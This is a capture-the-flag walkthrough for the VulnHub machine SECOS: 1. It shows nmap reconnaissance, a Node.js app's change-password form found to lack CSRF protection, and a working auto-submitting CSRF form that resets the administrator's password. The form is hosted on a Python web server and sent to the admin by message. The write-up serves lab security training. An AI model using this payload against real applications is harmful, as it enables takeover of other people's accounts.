# SECOS: 1

## Get VM IP :

```bash
root@kali: nmap -sn 192.168.127.0/24

Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 04:16 EDT
Nmap scan report for 192.168.127.1
Host is up (0.00061s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.127.136
Host is up (0.00040s latency).
MAC Address: 00:0C:29:4B:BB:8D (VMware)
Nmap scan report for 192.168.127.254
Host is up (0.00025s latency).
MAC Address: 00:50:56:F4:78:0D (VMware)
Nmap scan report for 192.168.127.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.58 seconds
```

The IP address is `192.168.127.136`, let's enumerate it.

## Enumeration

```bash
root@kali: nmap -sV -sC 192.168.127.136 -oN fulscan

Nmap scan report for 192.168.127.136
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
|   256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
|_  256 a1:77:7b:f2:31:0b:81:ce:f2:09:47:06:e6:b0:80:fa (ED25519)
8081/tcp open  http    Node.js (Express middleware)
|_http-title: Secure Web App
MAC Address: 00:0C:29:4B:BB:8D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports `22` and `8081` is open, so lets begin navigating the site.

in the first page we see a message and menue above :

![mainpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/42697f15-e96d-47f2-921d-062fa3897420)

fuzzing and directory brute forcing leads to nothing interesting except `/hint` directory which shows some hints :

![hint](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8400e744-51ef-4248-838f-4c6611211d41)

it is abvious that :
- admin will run the service locally on 127.0.0.1
- it says CSRF meaning we should look for it
- and the regex is for finding URL

gathering the above information we begin our work.

i signed up for an account : `myacc:123`

three new functionality appears after loggin in :

![afterlogin](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5a75cc52-f54e-4473-995e-d0106d3b9ffc)

if we check the `change password` we clearly see that is it vulnerable to CSRF attack because it meets 3 conditions :

- it is state changing
- it uses cookie for sessions
- it has no protection like CSRF token

keep it in mind we explore the `Messages` and `send message` functionality which we can send message to other users

and other users are listed in `users` menu :

![users](https://github.com/Git-K3rnel/VulnHub/assets/127470407/94484819-71ec-4ec1-82de-8f7342272aa3)

we see that user `spiderman` is administrator so we should some how try to reach his account.

since we have CSRF vulnerability and can send message to spiderman we create a CSRF POC and send a link to spiderman (remember that admin will run service locally)

```html
<html>
  <body>
    <form action="http://127.0.0.1:8081/change-password" method="POST">
      <input type="hidden" name="password" value="123" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

put the aboove code in `visit.html` file and host it with python webserver :

```bash
root@kali: python -m http.server 80
```

send the link in message to spiderman : 

![sendmessage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/3155e9d5-b513-4e9c-9eaa-520166e05c8f)

after sending message and waiting afew seconds we expect that spiderman passwrod would change to `123`




